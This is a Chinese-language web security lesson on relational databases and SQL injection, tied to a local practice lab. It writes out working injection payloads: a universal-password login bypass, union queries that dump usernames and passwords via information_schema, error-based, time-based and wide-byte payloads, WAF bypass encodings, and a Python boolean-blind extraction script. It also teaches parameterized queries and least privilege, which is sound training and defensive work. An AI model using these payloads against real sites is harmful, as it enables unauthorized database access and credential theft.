数据库与 SQL 注入

前两讲，你学会了看请求、写脚本、读别人的代码。 这一讲往下走一层：到服务器背后那个装数据的地方去。 注入是 Web 安全里最老、也最经打的一类洞，它在 OWASP 榜单上待了二十年还没走。

第三讲 · 数据库基础 + 六种注入手法 · 含 1 个零配置 SQL 靶场

这一讲在讲什么

前两讲的靶场，数据都是写死在代码里的。真实网站不是这样 —— 用户、文章、订单，全存在数据库里。

于是问题来了：网站要按用户输入查数据，那它怎么把"查询条件"告诉数据库？ 最省事的做法是拼字符串。而拼字符串，就是注入的入口。

注入之所以存在，是因为有人把"数据"当成了"代码"来执行。

这一讲分两半：前一半讲数据库和 SQL 是什么、怎么用； 后一半讲攻击者怎么把这套东西掉过头来用。顺序不能反 —— 不先知道 SQL 长什么样，你根本看不出哪里被插了一段。

数据库到底解决什么问题

数据库出现之前，数据大多存在文件里。文件方案有三个绕不过去的毛病：

  • 冗余与不一致 —— 同一个数据在好几个文件里各存一份，改了一个忘了另一个
  • 难以共享 —— 数据和程序绑死，换个程序就得重新组织一遍
  • 并发与权限没法管 —— 两个人同时写就乱了，谁能读谁能写也说不清

数据库管理系统（DBMS）干的就是把这些事统一管起来： 结构化地存、保证一致、允许多人同时用、控制谁能看什么、出事了能恢复。

三种数据模型，现在只用一种

模型结构说明
层次模型树一对多，早期系统用，现在少见
网状模型图多对多，复杂但灵活，也少见了
关系模型二维表主流。MySQL、PostgreSQL、SQLite 都是它

关系模型就是"用表存数据"。一张表有行有列，表之间靠键关联。 设计阶段常用 E-R 图（实体-联系图）画概念，再转成实际的表。

几个必须记住的术语：

  • 关系（relation）= 一张表
  • 元组（tuple）= 一行记录
  • 属性（attribute）= 一列
  • 主键（primary key）—— 能唯一标识一行的那列，比如学号。不能重复、不能为空
  • 外键（foreign key）—— 指向另一张表主键的列，用来建立关联

表怎么设计才算合理：范式

原文档把这块讲得挺清楚，我只把结论拎出来：

  • 1NF —— 每个字段都不可再分（别把"张三,李四"塞进一个格子）
  • 2NF —— 在 1NF 基础上，非主属性必须完全依赖主键，不能只依赖主键的一部分
  • 3NF —— 再进一步，不能有传递依赖（A 决定 B，B 决定 C，那 C 就不该直接存在这张表里）
  • BCNF —— 更严格的一个版本

范式的目的是减少冗余、避免插入/删除/更新时出现矛盾。 但过度规范化会让查询要连很多表，性能下降。实际设计常在范式和性能之间权衡。

这块对做注入题的直接帮助不大，但它决定了你看到一张表时， 能不能看出"这个字段该不该在这"——审代码的时候有用。

完整性约束：数据库自己会拦的那些事

  • 实体完整性 —— 主键不能空、不能重复
  • 参照完整性 —— 外键必须指向一个真实存在的值
  • 用户定义完整性 —— 比如年龄必须在 0 到 150 之间

SQL 入门：能看懂、能改

SQL 是"结构化查询语言"，你不会写它，就看不懂注入的 payload。 这一节只讲够用的部分，剩下的等做题时现查。

SQL 语句分五类

类别全称干什么
DDL数据定义建库、建表、改结构。CREATE / ALTER / DROP
DML数据操作增删改表里的数据。INSERT / UPDATE / DELETE
DQL数据查询查数据。SELECT —— 你 90% 的时间在写它
DCL数据控制用户和权限。GRANT / REVOKE
TCL事务控制COMMIT / ROLLBACK

注释：注入里最常用的语法

MySQL 认四种注释，每种在注入里都有用处：

-- 两个连字符，后面必须跟空格或控制字符，注释到行尾
#  井号，注释到行尾
/* 块注释，可以跨行 */
/*! 可执行注释：MySQL 会把里面的内容当真执行 */
为什么注释在注入里这么重要

两条经典用法，记住就行：

  • 截断后半句。原语句是 ... where username='$u' and password='$p'， 你传 admin'-- -，后面那句密码校验就被注释掉了。
  • 绕过黑名单。union/**/select、 sel/**/ect，关键字中间插注释，很多简单的过滤就漏了。

还有 /*!...*/ 那种"可执行注释"——它长得像注释， 但 MySQL 会执行里面的内容。某些 WAF 只去掉普通注释，就会漏掉这个。

建库、建表、增删改查

先认全基本语句，不用背，知道有这么回事就行：

-- 库
show databases;                       -- 看有哪些库
create database jnsec;                 -- 建库
use jnsec;                             -- 切过去
select database();                     -- 我现在在哪个库
drop database jnsec;                   -- 删库（别乱敲）

-- 表
create table users (
    id int primary key auto_increment,
    username varchar(50),
    password varchar(50)
);

-- 增
insert into users (username, password) values ('admin', '123456');

-- 删（不写 where 会把整张表清空）
delete from users where id = 2;

-- 改（不写 where 会把整列都改掉）
update users set password = 'newpass' where id = 1;

-- 查
select * from users;                     -- 所有列
select username from users;              -- 指定列
select * from users where age < 20;      -- 条件
select * from users where id in (1,2,3); -- 集合
select * from users where name like 'a%';-- 模糊：% 任意多个字符，_ 任意一个
select * from users order by age desc;   -- 排序：asc 升序（默认），desc 降序
select * from users limit 0, 2;          -- 分页：从第 0 条开始，取 2 条
两张表怎么合起来：UNION 与 JOIN

这两个在注入里经常被搞混，先分清：

  • UNION —— 把两个 SELECT 的结果竖着拼起来。 要求两边列数相同、类型相近。注入里用它，就是把你想查的东西 "接"在正常结果后面一起显示出来。
  • JOIN —— 把两张表横向拼起来， 靠关联字段匹配。写正常查询用。

权限：DCL

这块对防御有意义 —— 后面讲"最小权限"会用到：

-- 建用户（用户名@来源地址，localhost 表示只准本机连）
create user 'jnsec'@'localhost' identified by 'qwert@12345';

-- 授权：把 test 库里所有对象的这些权限给他
grant select, insert, update, delete on test.* to 'jnsec'@'localhost';

-- 收权：grant 换成 revoke，to 换成 from
revoke delete on test.* from 'jnsec'@'localhost';

-- 查看
show grants for 'jnsec'@'localhost';

MySQL 不等于数据库

MySQL 只是众多关系数据库软件中的一种。SQLite 更轻（没有服务进程，直接读写文件）、 MSSQL 和 Oracle 常见于企业环境。它们都支持 SQL，但语法细节和特性差别不小 —— 这点在注入时很关键，换个数据库，payload 可能就完全不一样了。

注入是怎么发生的

先看一段最经典的登录代码： 

<?php
$username = @$_POST['username'];
$password = @$_POST['password'];

$sql = "select * from users where username = '$username' and password = '$password';";
$rs = mysqli_query($conn, $sql);

if ($rs->fetch_row()) {
    echo "success";
} else {
    echo "fail";
}
?>

逻辑没问题：用户名密码都对上就登录。问题出在字符串拼接上。

假设你填的用户名是 admin，密码填这个： 

' or '1'='1

拼出来的 SQL 就变成：

select * from users where username = 'admin' and password = '' or '1'='1';

拆开看：'1'='1' 永远为真，所以整个条件永远为真， or 后面的东西全被短路了。这就是"万能密码"。

构造方式千变万化（admin'-- -、' or 1=1#、' or 'a'='a）， 但本质只有一句：服务器把你输入的东西当成了 SQL 代码的一部分。

换个角度理解：数据与代码没分开

正经的查询应该是："我要找一个 用户名等于这段文字 的用户"—— 这段文字是数据，无论它长什么样，都只当文字看。

而拼接的做法是：把文字塞进 SQL 语句的语法结构里，然后整体解析。 于是文字里带的引号、or、-- 就变成了语法。

防御的核心思想就一句话：让数据永远是数据，不进入语法解析的通道。 后面第八节的"参数化查询"，干的就是这件事。

找注入点：类型、闭合、字段数

拿到一个 URL，怎么知道它能不能注、该怎么注？有个固定套路。

第一步：判断有没有注入

最常用的两个动作：

id=1 and 1=1    -- 页面正常
id=1 and 1=2    -- 页面异常 → 说明 and 后面的条件真的被数据库执行了 → 有注入

或者直接甩一个单引号 '，看页面会不会报错、或者内容和之前不一样。

第二步：判断闭合方式

这一步决定了你后面所有 payload 的写法。三种常见情况：

类型后端语句长这样你要怎么填
数字型 select * from t where id = 1 不用闭合，直接接 and 1=1
字符型 select * from t where id = '1' 先用 ' 把引号闭合，再接 and 1=1-- -
搜索型 select * from t where name like '%test%' 要用 %' 闭合

另外还有 ()、"" 这类闭合，看具体语句。判断的办法都一样： 猜它外面包了什么，然后把它"补全"。

第三步：判断字段数

因为 UNION 要求两边列数相同，所以得先知道原查询有几列： 

id=1 order by 1;    -- 不报错
id=1 order by 2;    -- 不报错
id=1 order by 3;    -- 不报错
id=1 order by 4;    -- 报错 → 说明只有 3 列

order by N 的意思是"按第 N 列排序"，第 N 列不存在就会报错。 一直往上试，到报错为止，前一个数就是列数。

第四步：选手法

这一步决定了你接下来是几分钟搞定，还是要跑一晚上脚本： 

页面显示查询结果        →  联合查询注入（最快）
页面显示数据库报错      →  报错注入
两者都没有              →  布尔盲注（慢，要脚本）
连真假都判断不出来      →  时间盲注（最慢，但最稳）

特殊场景：堆叠注入 / 二次注入 / 宽字节注入
这块的顺序别搞反

新手常犯的错是一上来就写盲注脚本，跑了一晚上才拿到库名 —— 而那个页面其实是有回显的，union select 一条就全出来了。

先花两分钟确认回显情况，能省几个小时的力气。

联合查询注入

最好用的一种，前提是页面会把查询结果回显出来。

它的核心逻辑

原查询是 select id, name from users where id = 1。 你把它变成： 

select id, name from users where id = -1
union select 1, database()

前半句 id = -1 查不到任何东西（保证结果集空着）， 后半句的结果就被接在同一个位置显示出来。

为什么前面要返回空？因为如果前半句有结果， 有的页面只显示第一行，你的 union 结果就被挤掉了。 用 -1 或者一个不存在的 id 就稳了。

从"能注"到"能拖库"：信息模式

MySQL 5.0 以后有个特殊的库叫 information_schema， 它存的是"数据库自己的信息"：有哪些库、哪些表、哪些列。

表关键字段装的是什么
information_schema.schemataschema_name所有库名
information_schema.tablestable_name所有表名
information_schema.columnscolumn_name所有列名

这就是从"能注入"到"能把整个库拖下来"的桥。记住这三个表，一大半的题都能解。

完整流程，五步

-- ① 判断列数（假设是 4）
id=1 order by 4;

-- ② 找当前库名（让前半句空着，结果留给 union）
id=-1 union select database(), 2, 3, 4;

-- ③ 查这个库里有哪些表
id=-1 union select group_concat(table_name), 2, 3, 4
from information_schema.tables
where table_schema = database();

-- ④ 查某张表有哪些列（把上一步的表名填进去）
id=-1 union select group_concat(column_name), 2, 3, 4
from information_schema.columns
where table_name = 'users' and table_schema = database();

-- ⑤ 直接把数据读出来
id=-1 union select group_concat(username, 0x3a, password), 2, 3, 4
from users;
几个实用的小技巧
  • group_concat() —— 把多行合成一行显示。 不加它，一次只能看到一个值。
  • 0x3a —— 十六进制的冒号，用来把用户名和密码拼在一起， 比 concat(username, ':', password) 少写几个字符。
  • 回显位 —— 页面上真正显示出来的那几列。 用 2,3,4 这种挨个试，哪个位置能看到数字，哪个就是回显位。

报错注入

页面不显示查询结果，但会把数据库的报错信息打印出来 —— 这种情况用报错注入。

原理：让错误信息自己把数据带出来

SQL 执行时会先算参数、再调用函数。某些函数在参数格式不对时会报错， 而报错信息里会带上你传进去的那个参数值。

于是就有了这么一招：把想查的数据拼进参数，让它出现在错误信息里。

最常用的两个函数

-- extractvalue(xml_frag, xpath_expr)
-- 从 XML 里按 XPath 取值。xpath_expr 写错就会报错，并把表达式内容带出来
id=1 and extractvalue(1, concat(0x7e, (select database()), 0x7e))

-- updatexml(xml_target, xpath_expr, new_xml)
-- 同样是 XPath 解析失败时报错
id=1 and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)

0x7e 是波浪号 ~。它不是一个合法的 XPath 写法， 所以一定会报错 —— 而报错信息长这样： 

XPATH syntax error: '~jnsec_db~'

库名就这么"报"出来了。

两个必须知道的限制
  • 长度有限。报错信息通常只显示前 32 个字符左右， 长了会被截断。所以要用 substr() 分段读，或者用 limit 一次读一条。
  • 版本有关。MySQL 5.1 以后才有这两个函数。 新版本（8.0+）对 XPath 报错的处理有变化，某些环境里不好用了 —— 遇到打不出来，换 GTID_SUBSET、exp() 之类的函数试试。

报错函数不止这两个。思路是通用的：找一个"参数写错就把参数值抛进错误里"的函数。 做题时搜"MySQL 报错注入函数"能翻出一大把。

SQLite 没有这条路

我们靶场用的是 SQLite，它没有 extractvalue， 报错信息也不会带出参数值。所以靶场里没有报错注入那一关 —— 这个手法需要 MySQL 环境，装个 sqli-lab 就能练。

盲注：没有回显怎么办

前两种手法都依赖页面给你点什么 —— 结果，或者报错。 如果页面什么都不给呢？只显示"用户存在"和"用户不存在"两种状态？

那就只能一个字一个字地猜。这听起来很蠢，但机器不怕蠢。

布尔盲注：用"真/假"当信道

-- 问：user() 的第一个字符是不是 'r'？
id=1 and substr((select user()), 1, 1) = 'r'

页面正常 → 是；页面异常 → 不是。 换成 ascii() 更好写脚本，因为可以直接比较数字： 

id=1 and ascii(substr((select user()), 1, 1)) = 114

114 是 r 的 ASCII 码。脚本的逻辑就是： 遍历所有可打印字符，挨个试，哪个让页面"真"了，就记下来，接着猜下一位。 

import requests

url = "http://127.0.0.1:8083/gate3"
flag = ""

for pos in range(1, 60):
    for code in range(32, 127):
        # 靶场是 SQLite，取字符码用 unicode()；
        # MySQL 那边对应的是 ascii()，作用一样
        payload = "1 and unicode(substr((select value from secrets where id=2),%d,1))=%d" % (pos, code)
        r = requests.get(url, params={"id": payload})
        if "存在" in r.text:          # 页面回显"存在"就说明猜对了
            flag += chr(code)
            print(flag)
            break
    else:
        break                          # 所有字符都不匹配，说明到头了

print("结果:", flag)

一个字符最多试 95 次，一段 30 字符的 flag 要发近三千个请求。 所以盲注一定要上脚本，手工点是点不完的。

优化思路

95 次太多？可以用二分法：不猜具体值，只问"大于 64 吗"， 每次砍掉一半，7 次就能确定一个 ASCII 字符（因为 2 的 7 次方是 128）。

再进一步，用 regexp 或者 like 可以一次匹配多个字符。

时间盲注：连真假都看不出来

页面永远是同一个样子，那只能靠响应时间了： 

-- 如果第一个字符是 'r'，就睡 2 秒
id=1 and if(substr((select user()),1,1)='r', sleep(2), 1)

脚本那边就是测响应时间：超过 2 秒 → 猜对；秒回 → 猜错。

时间盲注还能用来确认注入点到底存不存在： 有时候页面没变化，你以为没洞，其实只是没回显。 发一个 and sleep(3) 试试，卡了三秒就说明代码被执行了。

记住这句话

盲注的核心思想：没有回显，就自己造一个回显。

页面真假是一种信道，响应时间是一种信道，DNS 请求、报错、状态码…… 任何能观察到的差异，都能当信道。这是盲注最本质的地方 —— 手法会变，思路不变。

实操

用脚本把盲注跑出来

第三节的靶场第三关就是布尔盲注。页面只告诉你"这个用户存在"或"不存在"， 其他什么都不给。

把上面那段脚本存成 blind.py，改成靶场地址，跑起来：

python blind.py

你会看到它一个字符一个字符往外蹦。这就是盲注真实的样子 —— 不快，但只要能观察到差异，就一定能拿到。

特殊场景：三条不那么直的路

堆叠注入

用分号把多条语句拼在一起，让数据库一条一条执行： 

id=1; select database();

能不能成功，取决于驱动。PHP 的 mysqli_query 默认只执行一条，PDO 要专门开 PDO::MYSQL_ATTR_MULTI_STATEMENTS 才行。 MySQL 相对少见，MSSQL 里更常见。

危害也大 —— 因为它能执行任意 SQL，不只读，还能增删改。

二次注入

最绕的一种。恶意数据先存进库，之后被取出来重新拼接，才触发注入。

经典场景是修改密码： 

update users set password='$new' where username='$user' and password='$old';

注册一个用户名叫 admin'# 的账号 —— 注册时不会有问题， 因为注册的语句只是把这段文字存进去。

等你改这个账号的密码时，它被取出来拼接： 

update users set password='新密码' where username='admin'#' and password='$old';

# 把后面全注释了。于是你不需要知道 admin 的原密码，就把 admin 的密码改了。

为什么它特别坑

因为第一次入库时，数据可能已经被转义过了 —— 看起来"安全"。 但取出来之后，那些转义符往往又被还原，或者干脆原样拼进了新语句。

这就是"只做转义"不算防御的典型例子。

宽字节注入

这个跟编码有关，第二讲讲编码时埋过伏笔。

前提两个：数据库连接字符集是 GBK，代码用 addslashes() 这类基于字符的转义。

正常情况：你传 '，它转义成 \'，引号就失效了。

但 GBK 里一个汉字占两个字节。如果你传 %df'： 

%df'  --转义-->  %df\'  --也就是 %df%5c%27

GBK 解析时：%df%5c 被当成一个完整的汉字（"運"），
            剩下 %27 就是一个光秃秃的单引号 → 逃逸成功

payload 长这样：

?id=%df' and 1=1 --+

本质是编码方式不一致：转义模块按单字节处理，数据库按双字节解析， 中间那一段被"吃"掉了。

绕过与防御

常见绕过手法

手法例子绕过什么
大小写混写SeLEcT只匹配小写关键词的黑名单
等价函数substr → mid / left / right函数名黑名单
空格替代+、/**/、%09、%0a过滤空格的规则
十六进制'test' → 0x74657374引号被过滤
注释插入un/**/ion、sel/**/ect关键词整体匹配
编码绕过URL 编码、Unicode、双重编码解码顺序不一致
元数据替代information_schema → mysql.innodb_table_stats元数据表被禁

这些手法的共同点：黑名单永远列不全。 你今天封了 union，人家明天用 union all、用注释拆开、用大写。

防御：三层

第一层 · 参数化查询（治本）

核心是先把 SQL 骨架编译好，再把参数当数据传进去。 这样数据到数据库时，语法解析已经结束了 —— 你传什么内容都只是值。 

// Java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, userInput);      // 输入只当字符串
ps.setString(2, passwordInput);

// PHP PDO
$stmt = $pdo->prepare('SELECT id, username FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
MyBatis 里那个经典坑

#{} 走预编译，安全； ${} 直接拼字符串，等于没防。

除了表名、列名、排序方向这种没法用参数绑定的地方（那些必须配白名单）， 其他一律用 #{}。

第二层 · 输入校验与白名单

参数化解决的是"值"。但有些位置参数绑不进去 —— 表名、列名、排序方向。 那些地方只能靠白名单映射： 

$sortMap = [
    'name' => 'username',
    'date' => 'created_at',
];
$key = $_GET['sort'] ?? 'name';
$column = $sortMap[$key] ?? 'username';   // 不在表里就退回默认

$sql = "SELECT id, username FROM users ORDER BY $column";

注意：拼进 SQL 的列名来自程序里写死的映射表，不是用户输入本身。

黑名单为什么不顶用

删掉 select、删掉引号、删掉括号 —— 这种思路有三个致命问题：

  • 永远列不全（上面那张表就是证据）
  • 会误伤正常输入（用户名字里带个括号就炸了）
  • 挡不住上下文差异（同一个字符在不同位置行为不同）

第三层 · 兜底

  • 最小权限 —— 应用连数据库的账号，只给业务需要的权限。只读的接口就给 select，别给 drop
  • 关掉详细错误 —— 报错信息别返回给用户，写进日志
  • WAF —— 能挡一部分批量扫描，但它是辅助，不能替代代码里的修复
  • 代码审查 —— 搜索所有拼接 SQL 的地方，逐个改
如果让你去修一个已有系统
  1. 先止血：登录、查询这些核心功能，优先改成参数化
  2. 再收敛：数据库账号降权，关掉详细报错
  3. 后兜底：WAF 规则加上，但不能停在前两步就完事
